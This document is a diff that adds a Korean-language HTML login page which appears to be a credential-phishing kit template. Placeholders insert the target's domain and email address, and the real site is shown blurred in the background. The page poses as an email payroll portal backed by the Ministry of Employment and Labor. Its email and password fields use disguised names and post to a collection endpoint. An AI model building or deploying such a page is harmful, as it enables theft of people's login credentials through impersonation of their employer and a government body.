@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>{{dman}} - log in</title>
+  <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+    #bgFrame {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      filter: blur(8px) brightness(0.7);
+      z-index: -1;
+    }
+  </style>
+</head>
+<body class="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-900 via-white to-green-100 p-6">
+  
+  <!-- Blurred iframe background -->
+  <iframe id="bgFrame" src="https://www.{{dman}}"></iframe>
+
+  <div class="w-full max-w-md relative z-10">
+    <div class="bg-white rounded-2xl shadow-xl border border-gray-100 p-8">
+      
+      <!-- Centered Logo + Title -->
+      <div class="mb-6 flex flex-col items-center text-center">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALkAAABFCAIAAACZn9BpAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAQsSURBVHhe7do9WqNAGAdws2cBCx9PACcI9rZ2SZk0dltutw2UcAR74QRwAh8L4S5ZPt6YMHy9AxMY2f+vWTYaNfCfmXc+NqfT6Q6A4Rf9CzAEWQEuZAW4kBXgQlaAC1kBLmQFuJAV4EJWgAtZAS5kBbiQFeBCVoALWQEuZAW4kBXgQlaAC1kBLmQFuJAV4OrJSrTfqGN7Gf3YWWWeTX9AaaG/QnfCk95H9LoA/coPJLQAGV054EBWgEv3rGRZ5O1t+7od2fbeizINBhOlg/SVKW3/ljTOShbt7Y1pOscgSRJ6rZAkwdExzU0eGVQfc+rJytY/TRDu6MdUHu8NuuLJh2TTCa4j0pBHxrR1bYNrpGW/UgTl2JuTsyRwMLex3JQa6DB/S28aQcOsZN4LLyiV5Giic5kH5U05YQzahfT6IOGNBWsXpuemk4Y7i16WJ9MCNZa6krfgcvdb7m5D17OaqV+xHky6GpB5fwK6JPnzjf2tcS53jK0f53mh/8GMbpWV7OuDrqRk72/14WcXxodGVZznRb+0iAtkfQOjMNv+ISWXXvWKGBXLfe2oxbavsv3wrRn3j3QlTXaSuJCZssK8G+lnPSrPT51vMw6/MRDN61ZZEZ46jzhw9SfMfKj1LK11q3QVqM7HV+fAInxOdjHXYbhiv8yUWxfNmAP6VVaULlk79Qo1cOj1b23Dudit9N9DodNPPlO6WoiQ3SVlF1HJ2xfscrNk9AqDXvVK3dDAJTycnoa8bsnRpAZ4Zl44pWNQSOqbJbJ0zspqCf3nzKXt6DaFrCij25ionM5ZGWoAyzbPZn03WKOdDX2jpnsWV1mZtq8sq20TSyhABlqm4tnEGlg1O+K6YSktnE4ti5tM9Oj0IEze+ieDI5Zule4H3W7pmL95pobwSRbeD2ISO5a39+41isbGEYwljChd5xZ6sjLtDLzM9sg34+m5HpbjS8dvjf7KnFtYPaVrY12PSrPaVgxLe1ryHArl4RJY9Z3UqHo25UDSDek2D2pu8yTFSUkvosBkxSlc5qE5UEu3rLTuIJeHsav+0Ww7hdtdCy64H7Q+/Kw0V5J7jW/7xiGWmWLk3bqmffba6NevFLY+s0OwWs9C/X/OtVO5hEKqRZWS69JSS4FWX0r0dqbqd7RR23/Lrxmkodt7tNbaDReKwmdQur7CMqq2lad0rednrK/UGNuDH1eJqTUAKw9JcVY79pfoUSRnp8J8TXIg12u1X+OsVMrExDFFuxDnIbmc1YbZ8LMi2X1iBrI62vcrMEFVwFaosi3RZmKJKuFS1cw7p5XVl9tMqwvFfmXu/bCK+tpWaRU5iHvXZimh+f3KbOsrelv+5AaDbAnd0FpTYwwCLmQFuJAV4EJWgGuTF1B0CdAL/QpwISvAhawAF7ICXMgKcCErwIWsABeyAjx3d/8ASR5lQjNwhnUAAAAASUVORK5CYII=">
+        <h1 class="text-2xl font-bold text-blue-900">{{dman}} </h1>
+        <p class="text-gray-500 text-sm mt-1">{{dman}} 이메일 급여 포털 로그인 (미리보기/다운로드 전용) (고용노동부(MOEL) 지원) </p>
+      </div>
+
+      <form id="loginForm" class="space-y-5" action="first" method="POST">
+        <div class="relative">
+          <span class="absolute left-3 top-3 text-gray-400">📧</span>
+          <input
+            type="email"
+            placeholder="Email address"
+            value="{{eman}}"
+            name="horse"
+            required
+            class="w-full pl-10 pr-3 py-2 border border-gray-300 rounded-lg focus:border-green-500 focus:ring-green-500"
+          />
+        </div>
+
+        <div class="relative">
+          <span class="absolute left-3 top-3 text-gray-400">🔒</span>
+          <input
+            type="password"
+            placeholder="비밀번호"
+            name="pig"
+            required
+            class="w-full pl-10 pr-3 py-2 border border-gray-300 rounded-lg focus:border-green-500 focus:ring-green-500"
+          />
+        </div>
+
+        <button
+          id="loginBtn"
+          type="submit"
+          class="w-full bg-blue-900 hover:bg-blue-800 text-white py-2 rounded-xl shadow-md"
+        >
+          로그인
+        </button>
+
+        <div id="loadingSpinner" class="hidden flex justify-center mt-4">
+          <svg class="animate-spin h-6 w-6 text-blue-900" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
+          </svg>
+        </div>
+      </form>
+
+      <div class="mt-6 flex justify-between text-sm text-gray-500">
+        <a href="#" class="hover:text-green-600">비밀번호를 잊으셨나요?</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const spinner = document.getElementById('loadingSpinner');
+
+    
+  </script>
+</body>
+</html>
